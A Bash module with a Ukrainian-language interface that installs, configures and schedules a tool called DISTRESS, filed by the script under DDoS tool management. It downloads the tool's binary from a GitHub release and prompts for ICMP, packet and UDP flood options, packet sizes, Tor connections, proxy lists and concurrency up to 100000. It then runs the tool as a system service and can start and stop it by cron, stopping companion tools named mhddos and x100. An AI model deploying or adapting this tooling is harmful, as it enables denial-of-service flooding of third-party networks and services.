set -uo pipefail

install_distress() {
    local dist_family
    dist_family=$(get_distribution_family)
    local arch
    arch=$(get_normalized_arch)
    local init_system
    init_system=$(get_init_system)

    if ! tool_supports_platform "distress" "$dist_family" "$arch" "$init_system"; then
      cdss_dialog "$(trans "DISTRESS не підтримується на цій платформі. Потрібно: amd64/arm64/arm32 + systemd/openrc.")${NC}"
      return 1
    fi

    cdss_dialog "$(trans "Встановлюємо DISTRESS")"

    install() {
        cd "$TOOL_DIR" || return 1
        package=''
        case "$arch" in
          amd64)
            package=https://github.com/corpus-dev/distress_releases/releases/latest/download/distress_x86_64-unknown-linux-musl
          ;;

          arm64)
            package=https://github.com/corpus-dev/distress_releases/releases/latest/download/distress_aarch64-unknown-linux-musl
          ;;

          arm32)
            package=https://github.com/corpus-dev/distress_releases/releases/latest/download/distress_arm-unknown-linux-musleabi
          ;;

          *)
            confirm_dialog "$(trans "Неможливо визначити розрядность операційної системи")"
            ddos_tool_managment
            return 1
          ;;
        esac

        sudo_or_root curl -Lo distress "$package"
        if [[ $? -ne 0 ]]; then
          return 1
        fi
        if [[ ! -s distress ]]; then
          return 1
        fi
        sudo_or_root chmod +x distress
    }
    install 2>&1
    if [[ $? -ne 0 ]]; then
      confirm_dialog "$(trans "DISTRESS встановлення не вдалося. Перевірте інтернет-з'єднання.")"
      return 1
    fi
    if [[ ! -f "$TOOL_DIR/distress" ]]; then
      confirm_dialog "$(trans "DISTRESS бінарник не знайдено після встановлення.")"
      return 1
    fi
    regenerate_distress_service_file
    create_symlink
    confirm_dialog "$(trans "DISTRESS успішно встановлено")"
}

configure_distress() {
    clear
    local -A params;

echo -e "${ORANGE}$(trans "Залишіть пустим якщо бажаєте видалити параметри")${NC}"
    echo -ne "\n"
    echo -ne "${GREEN}$(trans "В процесі відновлення")${NC}\n"
    echo -ne "${GREEN}$(trans "Надається Telegram ботом")${NC} ${ORANGE}$(trans "В статусі відновлення, очікуйте на оновлення")${NC}\n"
    echo -ne "\n"
    read -e -p "$(trans "Юзер ІД: ")" -i "$(get_distress_variable 'user-id')" user_id
    if [[ -n "$user_id" ]];then
      while [[ ! $user_id =~ ^[0-9]+$ ]]
      do
        echo "$(trans "Будь ласка введіть правильні значення")"
        read -e -p "$(trans "Юзер ІД: ")" -i "$(get_distress_variable 'user-id')" user_id
      done
    fi

    params["user-id"]="$user_id"

    read -e -p "$(trans "Відсоткове співвідношення використання власної IP адреси (0-100): ")" -i "$(get_distress_variable 'use-my-ip')" use_my_ip

    if [[ -n "$use_my_ip" ]]; then
      while [[ $use_my_ip -lt 0 || $use_my_ip -gt 100 ]]
      do
        echo "$(trans "Будь ласка введіть правильні значення")"
        read -e -p "$(trans "Відсоткове співвідношення використання власної IP адреси (0-100): ")" -i "$(get_distress_variable 'use-my-ip')" use_my_ip
      done

    fi
    params["use-my-ip"]="$use_my_ip"

    if [[ $use_my_ip -gt 0 ]]; then

      read -e -p "$(trans "Увімкнути ICMP флуд (1 | 0): ")" -i "$(get_distress_variable 'enable-icmp-flood')" enable_icmp_flood
      if [[ -n "$enable_icmp_flood" ]];then
        while [[ "$enable_icmp_flood" != "1" && "$enable_icmp_flood" != "0" ]]
        do
          echo "$(trans "Будь ласка введіть правильні значення")"
          read -e -p "$(trans "Увімкнути ICMP флуд (1 | 0): ")" -i "$(get_distress_variable 'enable-icmp-flood')" enable_icmp_flood
        done
      fi

    params["enable-icmp-flood"]="$enable_icmp_flood"

      read -e -p "$(trans "Увімкнути packet флуд (1 | 0): ")" -i "$(get_distress_variable 'enable-packet-flood')" enable_packet_flood
      if [[ -n "$enable_packet_flood" ]];then
        while [[ "$enable_packet_flood" != "1" && "$enable_packet_flood" != "0" ]]
        do
          echo "$(trans "Будь ласка введіть правильні значення")"
          read -e -p "$(trans "Увімкнути packet флуд (1 | 0): ")" -i "$(get_distress_variable 'enable-packet-flood')" enable_packet_flood
        done
      fi
    params["enable-packet-flood"]="$enable_packet_flood"

      read -e -p "$(trans "Вимкнути UDP флуд (1 | 0): ")" -i "$(get_distress_variable 'disable-udp-flood')" disable_udp_flood
      if [[ -n "$disable_udp_flood" ]];then
        while [[ "$disable_udp_flood" != "1" && "$disable_udp_flood" != "0" ]]
        do
          echo "$(trans "Будь ласка введіть правильні значення")"
          read -e -p "$(trans "Вимкнути UDP flood (1 | 0): ")" -i "$(get_distress_variable 'disable-udp-flood')" disable_udp_flood
        done
      fi
    params["disable-udp-flood"]="$disable_udp_flood"

      if [[ "$disable_udp_flood" -eq 0 ]];then
        packageSize="$(get_distress_variable 'udp-packet-size')"
if [[ -z "$packageSize" ]];then
          packageSize=1420
        fi

        read -e -p "$(trans "Розмір UDP пакунку (576-1420): ")" -i "$packageSize" udp_packet_size
        if [[ -n "$udp_packet_size" ]];then
          while [[ "$udp_packet_size" -lt 576 || "$udp_packet_size" -gt 1420 ]]
          do
            echo "$(trans "Будь ласка введіть правильні значення")"
            read -e -p "$(trans "Розмір UDP пакунку (576-1420): ")" -i "$packageSize" udp_packet_size
          done
        fi

    params["udp-packet-size"]="$udp_packet_size"

        connCount="$(get_distress_variable 'direct-udp-mixed-flood-packets-per-conn')"
if [[ -z "$connCount" ]];then
          connCount=30
        fi

        read -e -p "$(trans "Кількість пакетів (1-100): ")" -i $connCount direct_udp_mixed_flood_packets_per_conn
        if [[ -n "$direct_udp_mixed_flood_packets_per_conn" ]];then
while [[ $direct_udp_mixed_flood_packets_per_conn -lt 1 || $direct_udp_mixed_flood_packets_per_conn -gt 100 ]]
          do
            echo "$(trans "Будь ласка введіть правильні значення")"
            read -e -p "$(trans "Кількість пакетів (1-100): ")" -i $connCount direct_udp_mixed_flood_packets_per_conn
          done
        fi

    params["direct-udp-mixed-flood-packets-per-conn"]="$direct_udp_mixed_flood_packets_per_conn"

      fi
    fi

    read -e -p "$(trans "Кількість підключень Tor (0-100): ")"  -i "$(get_distress_variable 'use-tor')" use_tor
    if [[ -n "$use_tor" ]];then
      while [[ $use_tor -lt 0 || $use_tor -gt 100 ]]
      do
        echo "$(trans "Будь ласка введіть правильні значення")"
        read -e -p "$(trans "Кількість підключень Tor (0-100): ")" -i "$(get_distress_variable 'use-tor')" use_tor
      done
    fi

    params["use-tor"]="$use_tor"

    read -e -p "$(trans "Кількість створювачів завдань (50-100000): ")"  -i "$(get_distress_variable 'concurrency')" concurrency
    if [[ -n "$concurrency" ]];then
      while [[ $concurrency -lt 50 || $concurrency -gt 100000 ]]
      do
        echo "$(trans "Будь ласка введіть правильні значення")"
        read -e -p "$(trans "Кількість створювачів завдань (50-100000): ")" -i "$(get_distress_variable 'concurrency')" concurrency
      done
    fi

    params["concurrency"]="$concurrency"

    read -e -p "$(trans "Проксі (шлях до файлу): ")" -i "$(get_distress_variable 'proxies-path')" proxies

    params["proxies-path"]="$proxies"

    echo -ne "\n"
    echo -e "${ORANGE}$(trans "Мережеві інтерфейси (через кому: eth0,eth1,тощо.)")${NC}"
    read -e -p "$(trans "Інтерфейси: ")"  -i "$(get_distress_variable 'interface')" interface
    if [[ -n "$interface" ]];then
    params["interface"]="$interface"
    else
      params[interface]=" "
    fi

    for i in "${!params[@]}"; do
    	  value="${params[$i]}"
    	  write_distress_variable "$i" "$value"
    done
    regenerate_distress_service_file
    local init_system
    init_system=$(get_init_system)
    if [[ "$init_system" == "systemd" ]] && service_is_active distress; then
        safe_remove_path "/tmp/distress" || true
        service_restart distress
    elif [[ "$init_system" == "openrc" ]] && service_is_active distress; then
        safe_remove_path "/tmp/distress" || true
        service_restart distress
    fi
    confirm_dialog "$(trans "Успішно виконано")"
}

get_distress_variable() {
  get_config_value "${SCRIPT_DIR}/services/EnvironmentFile" "distress" "$1"
}

write_distress_variable() {
  ensure_config_section "${SCRIPT_DIR}/services/EnvironmentFile" "distress"
  set_config_value "${SCRIPT_DIR}/services/EnvironmentFile" "distress" "$1" "$2"
}

regenerate_distress_service_file() {
  local config_file="${SCRIPT_DIR}/services/EnvironmentFile"
  local init_system
  init_system=$(get_init_system)

  local start="ExecStart=${SCRIPT_DIR}/bin/distress"

  local in_section=0
  declare -A data
  while IFS= read -r line; do
    local key value
    if [[ "$line" == "[distress]" ]]; then
      in_section=1
      continue
    fi
    if [[ "$line" == "[/distress]" ]]; then
      in_section=0
      continue
    fi
    if [[ "$in_section" == 0 ]]; then
      continue
    fi
    if [[ "$line" == *"="* ]]; then
      key="${line%%=*}"
      value="${line#*=}"
    fi

    if [[ "$key" == 'disable-udp-flood' ]]; then
      if [[ "$(get_distress_variable 'use-my-ip')" == 0 ]]; then
        continue
      fi
      if [[ "$(get_distress_variable 'disable-udp-flood')" == 0 ]]; then
        continue
      fi
      if [[ "$(get_distress_variable 'disable-udp-flood')" == 1 ]]; then
        value=" "
      fi
    fi

    if [[ "$key" == 'udp-packet-size' ]]; then
      if [[ "$(get_distress_variable 'use-my-ip')" == 0 ]]; then
        continue
      fi
      if [[ "$(get_distress_variable 'disable-udp-flood')" == 1 ]]; then
        continue
      fi
    fi

    if [[ "$key" == 'direct-udp-mixed-flood-packets-per-conn' ]]; then
      if [[ "$(get_distress_variable 'use-my-ip')" == 0 ]]; then
        continue
      fi
      if [[ "$(get_distress_variable 'disable-udp-flood')" == 1 ]]; then
        continue
      fi
    fi

    if [[ "$key" == 'enable-packet-flood' ]]; then
      if [[ "$(get_distress_variable 'use-my-ip')" == 0 ]]; then
        continue
      fi
      if [[ "$(get_distress_variable 'enable-packet-flood')" == 0 ]]; then
        continue
      fi
      if [[ "$(get_distress_variable 'enable-packet-flood')" == 1 ]]; then
        value=" "
      fi
    fi

    if [[ "$key" == 'enable-icmp-flood' ]]; then
      if [[ "$(get_distress_variable 'use-my-ip')" == 0 ]]; then
        continue
      fi
      if [[ "$(get_distress_variable 'enable-icmp-flood')" == 0 ]]; then
        continue
      fi
      if [[ "$(get_distress_variable 'enable-icmp-flood')" == 1 ]]; then
        value=" "
      fi
    fi

    if [[ "$key" == 'use-my-ip' && "$(get_distress_variable 'use-my-ip')" == 0 ]]; then
      continue
    fi
    if [[ "$key" == 'use-tor' && "$(get_distress_variable 'use-tor')" == 0 ]]; then
      continue
    fi

    if [[ -n "$value" ]]; then
      local escaped_value
      escaped_value=$(escape_for_execstart "$value")
      data["$key"]="$escaped_value"
    fi
  done < "$config_file"
  for key in "${!data[@]}"; do
    start="$start --$key ${data[$key]}"
  done

  if [[ "$init_system" == "systemd" ]]; then
    local tmp_svc
    tmp_svc=$(mktemp)
    while IFS= read -r line; do
      if [[ "$line" == ExecStart=* ]]; then
        echo "ExecStart=$start" >> "$tmp_svc"
      else
        echo "$line" >> "$tmp_svc"
      fi
    done < "${SCRIPT_DIR}/services/distress.service"
    mv -f "$tmp_svc" "${SCRIPT_DIR}/services/distress.service"
    service_daemon_reload
  fi
}

distress_run() {
  safe_remove_path "/tmp/distress" || true

  service_stop mhddos
  service_stop x100
  service_start distress
}

distress_auto_enable() {
  local init_system
  init_system=$(get_init_system)

  if [[ "$init_system" == "systemd" ]]; then
    service_disable mhddos
    service_disable x100
    service_enable distress
  elif [[ "$init_system" == "openrc" ]]; then
    service_disable mhddos
    service_disable x100
    service_enable distress
  else
    cdss_dialog "$(trans "Автозавантаження підтримується тільки на systemd та openrc.")"
    return 1
  fi
  create_symlink
  confirm_dialog "$(trans "DISTRESS додано до автозавантаження")"
}

distress_auto_disable() {
  local init_system
  init_system=$(get_init_system)

  if [[ "$init_system" == "systemd" ]]; then
    service_disable distress
  elif [[ "$init_system" == "openrc" ]]; then
    service_disable distress
  else
    cdss_dialog "$(trans "Автозавантаження підтримується тільки на systemd та openrc.")"
    return 1
  fi
  create_symlink
  confirm_dialog "$(trans "DISTRESS видалено з автозавантаження")"
}

distress_enabled() {
  service_is_enabled distress
}

distress_stop() {
  service_stop distress
}

distress_get_status() {
  while true; do
    clear
    local init_system
    init_system=$(get_init_system)

    service_status distress

    echo -e "${ORANGE}$(trans "Нажміть будь яку клавішу щоб продовжити")${NC}"
    sleep 3
    if read -rsn1 -t 0.1; then
      break
    fi
  done
  return 0
}

distress_installed() {
  if [[ ! -f "$TOOL_DIR/distress" ]]; then
      return 1
  else
      return 0
  fi
}

distress_configure_scheduler() {
  clear
  local min_label hour_label dom_label month_label dow_label
  min_label="$(trans "хвилина")"
  hour_label="$(trans "година")"
  dom_label="$(trans "день місяця")"
  month_label="$(trans "місяць")"
  dow_label="$(trans "день тижня")"
  local crontab_diagram
  crontab_diagram=$(cat <<'CRONTAB_EOF'
  .---------------- MINUTE_LABEL (0 - 59)
  |  .------------- HOUR_LABEL (0 - 23)
  |  |  .---------- DOM_LABEL (1 - 31)
  |  |  |  .------- MONTH_LABEL (1 - 12)
  |  |  |  |  .---- DOW_LABEL (0 - 6)
  |  |  |  |  |
  *  *  *  *  *
CRONTAB_EOF
)
  crontab_diagram="${crontab_diagram//MINUTE_LABEL/$min_label}"
  crontab_diagram="${crontab_diagram//HOUR_LABEL/$hour_label}"
  crontab_diagram="${crontab_diagram//DOM_LABEL/$dom_label}"
  crontab_diagram="${crontab_diagram//MONTH_LABEL/$month_label}"
  crontab_diagram="${crontab_diagram//DOW_LABEL/$dow_label}"
  crontab_diagram="${GREEN}${crontab_diagram}${NC}"
  echo "$crontab_diagram"

  echo -ne "\n\n"
  echo -ne "${GREEN}$(trans "Або згенеруйте його за посиланням") ${NC}${RED}https://crontab.guru/${NC}"
  echo -ne "\n\n"
  echo -ne "$(trans "Зверніть увагу на ваш час командою") ${GREEN}date${NC}"
  echo -ne "\n\n"
  echo -ne "$(trans "Наприклад:")"
  echo -ne "\n"
  echo -ne "  ${GREEN}$(trans "Запуск DISTRESS о 20:00 щодня") -${NC} ${RED}0 20 * * *${NC}"
  echo -ne "\n"
  echo -ne "  ${GREEN}$(trans "Зупинка DISTRESS о 08:00 щодня") -${NC} ${RED}0 8 * * *${NC}"
  echo -ne "\n\n"
  read -e -p "$(trans "Введіть cron-час для ЗАПУСКУ (формат: * * * * *): ")" -i "$(get_distress_variable 'cron-to-run')" cron_time_to_run
  echo -ne "\n"
  read -e -p "$(trans "Введіть cron-час для ЗУПИНКИ (формат: * * * * *): ")"  -i "$(get_distress_variable 'cron-to-stop')" cron_time_to_stop

  if [[ -n "$cron_time_to_run" ]]; then
    write_distress_variable "cron-to-run" "$cron_time_to_run"
  elif [[ "$cron_time_to_run" == "" ]]; then
    cron_remove_job "distress_run" || true
    write_distress_variable "cron-to-run" ""
  fi

  if [[ -n "$cron_time_to_stop" ]]; then
    write_distress_variable "cron-to-stop" "$cron_time_to_stop"
  elif [[ "$cron_time_to_stop" == "" ]]; then
    cron_remove_job "distress_stop" || true
    write_distress_variable "cron-to-stop" ""
  fi

  if [[ "$cron_time_to_run" == "" ]] && [[ "$cron_time_to_stop" == "" ]]; then
      confirm_dialog "$(trans "Запуск DISTRESS за розкладом припинено")"
      autoload_configuration
  elif [[ -n "$cron_time_to_run" ]] || [[ -n "$cron_time_to_stop" ]]; then
    to_start_distress_schedule_running
  else
    autoload_configuration
  fi
}

check_if_distress_running_on_schedule() {
  local crontab_content
  crontab_content=$(sudo_or_root crontab -l 2>/dev/null || true)
  if echo "$crontab_content" | grep -q '# CDSS:distress_run' || echo "$crontab_content" | grep -q '# CDSS:distress_stop'; then
    return 0
  fi
  return 1
}

to_start_distress_schedule_running() {
    local menu_items=("$(trans "Так")" "$(trans "Ні")")
    display_menu "$(trans "Запустити DISTRESS за розкладом?")" "${menu_items[@]}"
    res="$CDSS_SELECTION"
    case "$res" in
    "$(trans "Так")")
      run_distress_on_schedule
      confirm_dialog "$(trans "DISTRESS буде ЗАПУЩЕНО за розкладом")"
      autoload_configuration
    ;;
    "$(trans "Ні")")
      autoload_configuration
    ;;
    esac
}

stop_distress_on_schedule() {
  cron_remove_job "distress_run" || true
  cron_remove_job "distress_stop" || true
  write_distress_variable "cron-to-run" ""
  write_distress_variable "cron-to-stop" ""
}

run_distress_on_schedule() {
  local init_system
  init_system=$(get_init_system)

  if [[ "$init_system" == "systemd" ]]; then
    service_disable mhddos
    service_disable distress
    service_disable x100
  elif [[ "$init_system" == "openrc" ]]; then
    service_disable mhddos
    service_disable distress
    service_disable x100
  fi
  create_symlink

  chmod +x "$SCRIPT_DIR/utils/distress.sh"
  local cron_time_to_run=$(get_distress_variable 'cron-to-run')
  local cron_time_to_stop=$(get_distress_variable 'cron-to-stop')
  cron_remove_job "distress_run" || true
  cron_remove_job "distress_stop" || true
  cron_remove_job "mhddos_run" || true
  cron_remove_job "mhddos_stop" || true
  cron_remove_job "x100_run" || true
  cron_remove_job "x100_stop" || true

  if [[ -n "$cron_time_to_run" ]]; then
    local distress_script_path
    distress_script_path="$(shell_single_quote "${SCRIPT_DIR}/utils/distress.sh")"
    cron_install_job "distress_run" "$cron_time_to_run" ". ${distress_script_path} && distress_run"
  fi

  if [[ -n "$cron_time_to_stop" ]]; then
    local distress_script_path
    distress_script_path="$(shell_single_quote "${SCRIPT_DIR}/utils/distress.sh")"
    cron_install_job "distress_stop" "$cron_time_to_stop" ". ${distress_script_path} && distress_stop"
  fi
}

initiate_distress() {
   distress_installed
   if [[ $? == 1 ]]; then
    confirm_dialog "$(trans "DISTRESS не встановлений, будь ласка встановіть і спробуйте знову")"
    ddos_tool_managment
  else
      if service_is_active distress; then
        local active_disactive="$(trans "Зупинка DISTRESS")"
      else
        local active_disactive="$(trans "Запуск DISTRESS")"
      fi
      local menu_items=("$active_disactive" "$(trans "Налаштування DISTRESS")" "$(trans "Статус DISTRESS")" "$(trans "Повернутись назад")")
      display_menu "DISTRESS" "${menu_items[@]}"
      res="$CDSS_SELECTION"

       case "$res" in
         "$(trans "Зупинка DISTRESS")" )
            distress_stop
            distress_get_status
         ;;
         "$(trans "Запуск DISTRESS")" )
             distress_run
             distress_get_status
         ;;
         "$(trans "Налаштування DISTRESS")" )
            configure_distress
            return 0
          ;;
         "$(trans "Статус DISTRESS")" )
           distress_get_status
         ;;
         "$(trans "Повернутись назад")" )
           ddos_tool_managment
         ;;
       esac
  fi
}

stop_x100_on_schedule() {
  cron_remove_job "x100_run" || true
  cron_remove_job "x100_stop" || true
  write_x100_cdss_variable "cron-to-run" ""
  write_x100_cdss_variable "cron-to-stop" ""
}
